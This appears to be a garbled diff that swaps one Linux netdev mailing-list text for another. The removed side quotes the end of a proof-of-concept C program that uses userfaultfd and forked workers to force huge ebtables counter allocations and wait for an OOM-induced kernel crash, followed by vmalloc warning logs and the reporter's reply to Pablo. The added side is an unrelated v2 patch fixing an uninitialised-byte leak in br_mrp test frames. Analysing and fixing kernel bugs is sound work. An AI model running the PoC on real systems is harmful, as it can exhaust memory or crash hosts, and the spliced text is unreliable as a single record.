-> >       uint64_t value;
-> >       FILE *f =3D fopen("/proc/meminfo", "r");
-> >
-> >       if (!f)
-> >               fatal("fopen(/proc/meminfo)");
-> >       while (fscanf(f, "%127s %" SCNu64 " kB", name, &value) =3D=3D 2) =
-{
-> >               name[strcspn(name, ":")] =3D '\0';
-> >               if (strcmp(name, key) =3D=3D 0) {
-> >                       fclose(f);
-> >                       return value;
-> >               }
-> >       }
-> >       fclose(f);
-> >       fatal("read_meminfo_kb");
-> >       return 0;
-> > }
-> >
-> > static void kill_children(pid_t *children, int n)
-> > {
-> >       int i;
-> >
-> >       for (i =3D 0; i < n; i++)
-> >               if (children[i] > 0)
-> >                       kill(children[i], SIGKILL);
-> > }
-> >
-> > static void reap_children(pid_t *children, int n)
-> > {
-> >       int i;
-> >
-> >       for (i =3D 0; i < n; i++)
-> >               if (children[i] > 0)
-> >                       waitpid(children[i], NULL, 0);
-> > }
-> >
-> > static void run_oom_mode(int workers, int timeout_sec)
-> > {
-> >       struct blocker_state st;
-> >       struct table_info filter;
-> >       pthread_t blocker_tid;
-> >       pthread_t uffd_tid;
-> >       pid_t *children;
-> >       uint64_t mem_before, mem_after;
-> >       int i;
-> >
-> >       if (workers <=3D 0)
-> >               fatal("workers must be positive");
-> >
-> >       memset(&st, 0, sizeof(st));
-> >       get_table_info("filter", &filter);
-> >
-> >       fprintf(stderr,
-> >               "[setup] filter table: nentries=3D%u entries_size=3D%u va=
-lid_hooks=3D0x%x\n",
-> >               filter.nentries, filter.entries_size, filter.valid_hooks)=
-;
-> >       fprintf(stderr,
-> >               "[setup] huge update request: len=3D%u num_counters=3D%u =
-allocation=3D%zu bytes\n",
-> >               HUGE_COUNTERS_LEN, HUGE_NUM_COUNTERS,
-> >               (size_t)HUGE_NUM_COUNTERS * sizeof(struct ebt_counter));
-> >
-> >       st.page_size =3D sysconf(_SC_PAGESIZE);
-> >       if (st.page_size <=3D 0)
-> >               fatal("sysconf(_SC_PAGESIZE)");
-> >
-> >       st.uffd =3D open_userfaultfd();
-> >       register_missing_page(&st);
-> >
-> >       st.req =3D calloc(1, sizeof(*st.req));
-> >       if (!st.req)
-> >               fatal("calloc(blocker request)");
-> >
-> >       snprintf(st.req->name, sizeof(st.req->name), "%s", "filter");
-> >       st.req->nentries =3D filter.nentries;
-> >       st.req->entries_size =3D filter.entries_size;
-> >       st.req->num_counters =3D 0;
-> >       st.req->entries =3D st.fault_page;
-> >       st.optlen =3D sizeof(*st.req) + filter.entries_size;
-> >
-> >       if (pthread_create(&uffd_tid, NULL, uffd_handler_thread, &st) !=
-=3D 0)
-> >               fatal("pthread_create(uffd)");
-> >       if (pthread_create(&blocker_tid, NULL, blocker_thread, &st) !=3D =
-0)
-> >               fatal("pthread_create(blocker)");
-> >
-> >       for (i =3D 0; i < timeout_sec * 100; i++) {
-> >               if (st.fault_seen)
-> >                       break;
-> >               usleep(10000);
-> >       }
-> >       if (!st.fault_seen) {
-> >               fprintf(stderr,
-> >                       "[setup] blocker did not hit the userfaultfd trap=
- within %d seconds\n",
-> >                       timeout_sec);
-> >               st.release_fault =3D 1;
-> >               pthread_join(blocker_tid, NULL);
-> >               pthread_join(uffd_tid, NULL);
-> >               exit(EXIT_FAILURE);
-> >       }
-> >
-> >       mem_before =3D read_meminfo_kb("MemAvailable");
-> >       fprintf(stderr, "[state] MemAvailable before workers: %" PRIu64 "=
- kB\n",
-> >               mem_before);
-> >
-> >       children =3D calloc((size_t)workers, sizeof(*children));
-> >       if (!children)
-> >               fatal("calloc(children)");
-> >
-> >       for (i =3D 0; i < workers; i++) {
-> >               pid_t pid =3D fork();
-> >
-> >               if (pid < 0)
-> >                       fatal("fork");
-> >               if (pid =3D=3D 0) {
-> >                       do_huge_update("bogus", true);
-> >                       _exit(EXIT_SUCCESS);
-> >               }
-> >               children[i] =3D pid;
-> >               fprintf(stderr, "[parent] spawned worker pid=3D%d\n", pid=
-);
-> >       }
-> >
-> >       sleep(2);
-> >       mem_after =3D read_meminfo_kb("MemAvailable");
-> >       fprintf(stderr,
-> >               "[state] MemAvailable after workers: %" PRIu64 " kB (delt=
-a=3D%" PRIi64 " kB)\n",
-> >               mem_after, (int64_t)mem_after - (int64_t)mem_before);
-> >       fprintf(stderr, "[state] waiting up to %d seconds for an OOM-indu=
-ced crash\n",
-> >               timeout_sec);
-> >
-> >       sleep(timeout_sec);
-> >
-> >       fprintf(stderr, "[cleanup] timeout expired without a kernel panic=
-; releasing blocker\n");
-> >       st.release_fault =3D 1;
-> >       pthread_join(blocker_tid, NULL);
-> >       pthread_join(uffd_tid, NULL);
-> >       kill_children(children, workers);
-> >       reap_children(children, workers);
-> >       free(children);
-> > }
-> >
-> > static void usage(const char *prog)
-> > {
-> >       fprintf(stderr,
-> >               "Usage:\n"
-> >               "  %s counters [table]\n"
-> >               "  %s replace [table]\n"
-> >               "  %s oom [workers] [timeout_sec]\n",
-> >               prog, prog, prog);
-> > }
-> >
-> > int main(int argc, char **argv)
-> > {
-> >       if (argc < 2) {
-> >               do_huge_update("bogus", true);
-> >               do_huge_replace("bogus", true);
-> >               return EXIT_FAILURE;
-> >       }
-> >
-> >       if (strcmp(argv[1], "counters") =3D=3D 0) {
-> >               const char *name =3D (argc >=3D 3) ? argv[2] : "bogus";
-> >               int ret =3D do_huge_update(name, true);
-> >
-> >               return (ret =3D=3D 0) ? EXIT_SUCCESS : EXIT_FAILURE;
-> >       }
-> >
-> >       if (strcmp(argv[1], "replace") =3D=3D 0) {
-> >               const char *name =3D (argc >=3D 3) ? argv[2] : "bogus";
-> >               int ret =3D do_huge_replace(name, true);
-> >
-> >               return (ret =3D=3D 0) ? EXIT_SUCCESS : EXIT_FAILURE;
-> >       }
-> >
-> >       if (strcmp(argv[1], "oom") =3D=3D 0) {
-> >               int workers =3D (argc >=3D 3) ? atoi(argv[2]) : 3;
-> >               int timeout_sec =3D (argc >=3D 4) ? atoi(argv[3]) : 10;
-> >
-> >               run_oom_mode(workers, timeout_sec);
-> >               return EXIT_SUCCESS;
-> >       }
-> >
-> >       usage(argv[0]);
-> >       return EXIT_FAILURE;
-> > }
-> > ------END poc.c--------
-> >
-> > ----BEGIN crash log----
-> > EBT_SO_SET_COUNTERS path:
-> > [    1.577403] poc: vmalloc error: size 2147483520, exceeds total pages=
-, mode:0xcc0(GFP_KERNEL), nodemask=3D(null),cpuset=3D/,mems_allowed=3D0
-> > [    1.578954] CPU: 1 UID: 0 PID: 64 Comm: poc Not tainted 7.2.0-rc4-00=
-390-g743916aa8e8c #4 PREEMPT(lazy)
-> > [    1.579038] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a=
-rch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-> > [    1.579145] Call Trace:
-> > [    1.579555]  <TASK>
-> > [    1.579713]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:12=
-0)
-> > [    1.579934]  warn_alloc (mm/page_alloc.c:4023)
-> > [    1.579949]  __vmalloc_node_range_noprof (mm/vmalloc.c:4019)
-> > [    1.579960]  ? folio_add_file_rmap_ptes (include/linux/vmstat.h:542 =
-(discriminator 1) mm/rmap.c:1336 (discriminator 1) mm/rmap.c:1428 (discrimi=
-nator 1) mm/rmap.c:1706 (discriminator 1) mm/rmap.c:1732 (discriminator 1))
-> > [    1.579969]  ? do_update_counters.constprop.0 (net/bridge/netfilter/=
-ebtables.c:1395 (discriminator 2))
-> > [    1.579977]  ? filemap_map_pages (include/linux/rcupdate.h:873 mm/fi=
-lemap.c:3984)
-> > [    1.579992]  __vmalloc_node_noprof (mm/vmalloc.c:4143 (discriminator=
- 4))
-> > [    1.580006]  ? do_update_counters.constprop.0 (net/bridge/netfilter/=
-ebtables.c:1395 (discriminator 2))
-> > [    1.580011]  do_update_counters.constprop.0 (net/bridge/netfilter/eb=
-tables.c:1395 (discriminator 2))
-> > [    1.580020]  update_counters (net/bridge/netfilter/ebtables.c:1444)
-> > [    1.580030]  nf_setsockopt (net/netfilter/nf_sockopt.c:101)
-> > [    1.580052]  do_sock_setsockopt (net/socket.c:2368)
-> > [    1.580066]  __sys_setsockopt (net/socket.c:2393)
-> > [    1.580075]  __x64_sys_setsockopt (net/socket.c:2399 net/socket.c:23=
-96 net/socket.c:2396)
-> > [    1.580082]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/=
-entry/syscall_64.c:94)
-> > [    1.580090]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64=
-.S:121)
-> > [    1.580208] RIP: 0033:0x43523e
-> > [    1.580370] Code: ff ff ff f7 d8 64 89 02 b8 ff ff ff ff c3 66 2e 0f=
- 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05=
- <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 b8
-> > [    1.580416] RSP: 002b:00007ffd9e4c8f48 EFLAGS: 00000246 ORIG_RAX: 00=
-00000000000036
-> > [    1.580438] RAX: ffffffffffffffda RBX: 00007ffd9e4c8f50 RCX: 0000000=
-00043523e
-> > [    1.580447] RDX: 0000000000000081 RSI: 0000000000000000 RDI: 0000000=
-000000003
-> > [    1.580454] RBP: 00007ffd9e4cafd7 R08: 000000007ffffff8 R09: 0000000=
-000000000
-> > [    1.580461] R10: 00007ffd9e4c8f50 R11: 0000000000000246 R12: 0000000=
-000000003
-> > [    1.580469] R13: 00007ffd9e4c9278 R14: 00000000004de808 R15: 0000000=
-000000001
-> > [    1.580500]  </TASK>
-> > [worker] setsockopt(name=3Dbogus, len=3D2147483640, num_counters=3D1342=
-17720) -> ret=3D-1 errno=3D12 (Cannot allocate memory)
-> > EXIT 1
-> >
-> > EBT_SO_SET_ENTRIES path:
-> > [    8.275233] poc: vmalloc error: size 2147483520, exceeds total pages=
-, mode:0xcc0(GFP_KERNEL), nodemask=3D(null),cpuset=3D/,mems_allowed=3D0
-> > [    8.297875] CPU: 1 UID: 0 PID: 62 Comm: poc Not tainted 7.2.0-rc4-00=
-390-g743916aa8e8c #4 PREEMPT(lazy)
-> > [    8.297957] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, a=
-rch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-> > [    8.298283] Call Trace:
-> > [    8.298471]  <TASK>
-> > [    8.298471]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:12=
-0)
-> > [    8.298471]  warn_alloc (mm/page_alloc.c:4023)
-> > [    8.298471]  ? alloc_pages_bulk_noprof (mm/page_alloc.c:5338 mm/page=
-_alloc.c:5230)
-> > [    8.298471]  __vmalloc_node_range_noprof (mm/vmalloc.c:4019)
-> > [    8.298471]  ? do_replace_finish (net/bridge/netfilter/ebtables.c:10=
-24 (discriminator 2))
-> > [    8.298471]  ? __vmalloc_node_range_noprof (mm/vmalloc.c:694 mm/vmal=
-loc.c:703 mm/vmalloc.c:3924 mm/vmalloc.c:4082)
-> > [    8.298471]  __vmalloc_node_noprof (mm/vmalloc.c:4143 (discriminator=
- 4))
-> > [    8.298471]  ? do_replace_finish (net/bridge/netfilter/ebtables.c:10=
-24 (discriminator 2))
-> > [    8.298471]  do_replace_finish (net/bridge/netfilter/ebtables.c:1024=
- (discriminator 2))
-> > [    8.298471]  ? do_replace (net/bridge/netfilter/ebtables.c:1145 (dis=
-criminator 2))
-> > [    8.298471]  do_replace (net/bridge/netfilter/ebtables.c:1156)
-> > [    8.298471]  nf_setsockopt (net/netfilter/nf_sockopt.c:101)
-> > [    8.298471]  do_sock_setsockopt (net/socket.c:2368)
-> > [    8.298471]  __sys_setsockopt (net/socket.c:2393)
-> > [    8.298471]  __x64_sys_setsockopt (net/socket.c:2399 net/socket.c:23=
-96 net/socket.c:2396)
-> > [    8.298471]  do_syscall_64 (arch/x86/entry/syscall_64.c:63 arch/x86/=
-entry/syscall_64.c:94)
-> > [    8.298471]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64=
-.S:121)
-> > [    8.298471] RIP: 0033:0x4307be
-> > [    8.298471] Code: ff ff ff f7 d8 64 89 02 b8 ff ff ff ff c3 66 2e 0f=
- 1f 84 00 00 00 00 00 0f 1f 40 00 f3 0f 1e fa 49 89 ca b8 36 00 00 00 0f 05=
- <48> 3d 00 f0 ff ff 77 0a c3 66 0f 1f 84 00 00 00 00 00 48 c7 c2 b8
-> > [    8.298471] RSP: 002b:00007ffc525761e8 EFLAGS: 00000246 ORIG_RAX: 00=
-00000000000036
-> > [    8.298471] RAX: ffffffffffffffda RBX: 00000000031ae378 RCX: 0000000=
-0004307be
-> > [    8.298471] RDX: 0000000000000080 RSI: 0000000000000000 RDI: 0000000=
-000000003
-> > [    8.298471] RBP: 00007ffc52576280 R08: 0000000000000079 R09: 0000000=
-000000000
-> > [    8.298471] R10: 00007ffc52576280 R11: 0000000000000246 R12: 0000000=
-000000003
-> > [    8.298471] R13: 00007ffc52577fd7 R14: 00000000004de808 R15: 0000000=
-000000001
-> > [    8.298471]  </TASK>
-> > [worker] SET_ENTRIES name=3Dbogus len=3D121 entries_size=3D1 num_counte=
-rs=3D134217720 allocation=3D2147483520 -> ret=3D-1 errno=3D12 (Cannot alloc=
-ate memory)
-> > EXIT 1
-> > -----END crash log-----
-> >
-> > Best regards,
-> > Zihan Xi
-> >
-> > Zihan Xi (1):
-> >   netfilter: ebtables: avoid unbounded counter allocations
-> >
-> >  net/bridge/netfilter/ebtables.c | 34 ++++++++++++++++-----------------
-> >  1 file changed, 17 insertions(+), 17 deletions(-)
-> >
-> > --
-> > 2.43.0
+br_mrp_alloc_test_skb() builds MRP test frames on an skb from
+dev_alloc_skb(), which does not clear the linear data area.  On the MRA
+ring-role branch the sub-option TLV header is appended with
 
-Hi Pablo,
+	sub_tlv = skb_put(skb, sizeof(*sub_tlv));
+	sub_tlv->type = BR_MRP_SUB_TLV_HEADER_TEST_AUTO_MGR;
 
-Thanks, that is a fair point.
+so sub_tlv->length is never written, and the two trailing alignment bytes
+are appended with a bare skb_put() that does not clear them either.  The
+neighbouring oui and sub_opt regions are explicitly zeroed, so three
+uninitialised bytes are left in every MRA MRP_Test frame that goes out.
 
-Our concern was that invalid EBT_SO_SET_COUNTERS / EBT_SO_SET_ENTRIES
-requests can trigger a large temporary counter allocation before the
-kernel looks up the target table and checks the requested counter count
-against the table's actual nentries value.
+Put the sub-option TLV header and the alignment padding in a single
+skb_put_zero(), which clears both.  The AUTO_MGR sub-TLV carries no
+payload, so the zeroed length field is already the value it should have.
 
-That said, you are right that a privileged user may already be able to
-request large allocations through a sufficiently large, well-formed
-ebtables table, and by itself this only results in a large allocation
-attempt.
+Fixes: f7458934b079 ("net: bridge: mrp: Update the Test frames for MRA")
+Suggested-by: Nikolay Aleksandrov <razor@blackwall.org>
+Cc: stable@vger.kernel.org
+Signed-off-by: Baul Lee <baul.lee@xbow.com>
+---
+v2:
+ - fold the alignment padding into a single skb_put_zero() for the
+   sub-option TLV header, dropping the explicit length assignment and the
+   second skb_put() (Nikolay Aleksandrov)
+ - drop the paragraph about observing the leak, and the Reported-by tags
 
-So our original report may have overstated the practical impact. From
-your perspective, would you consider this primarily an undesirable
-validation-order issue, or do you think it is still worth fixing
-upstream?
+Link to v1: https://lore.kernel.org/netdev/20260726062518.43774-1-baul.lee@xbow.com/
 
-Thanks for the clarification.
+ net/bridge/br_mrp.c | 6 ++----
+ 1 file changed, 2 insertions(+), 4 deletions(-)
 
-Best regards,
-Zihan Xi
+diff --git a/net/bridge/br_mrp.c b/net/bridge/br_mrp.c
+index 179d2470b..ef16d0703 100644
+--- a/net/bridge/br_mrp.c
++++ b/net/bridge/br_mrp.c
+@@ -224,11 +224,9 @@ static struct sk_buff *br_mrp_alloc_test_skb(struct br_mrp *mrp,
+ 		sub_opt = skb_put(skb, sizeof(*sub_opt));
+ 		memset(sub_opt, 0x0, sizeof(*sub_opt));
+ 
+-		sub_tlv = skb_put(skb, sizeof(*sub_tlv));
+-		sub_tlv->type = BR_MRP_SUB_TLV_HEADER_TEST_AUTO_MGR;
+-
+ 		/* 32 bit alligment shall be ensured therefore add 2 bytes */
+-		skb_put(skb, MRP_OPT_PADDING);
++		sub_tlv = skb_put_zero(skb, sizeof(*sub_tlv) + MRP_OPT_PADDING);
++		sub_tlv->type = BR_MRP_SUB_TLV_HEADER_TEST_AUTO_MGR;
+ 	}
+ 
+ 	br_mrp_skb_tlv(skb, BR_MRP_TLV_HEADER_END, 0x0);
+-- 
+2.53.0
+
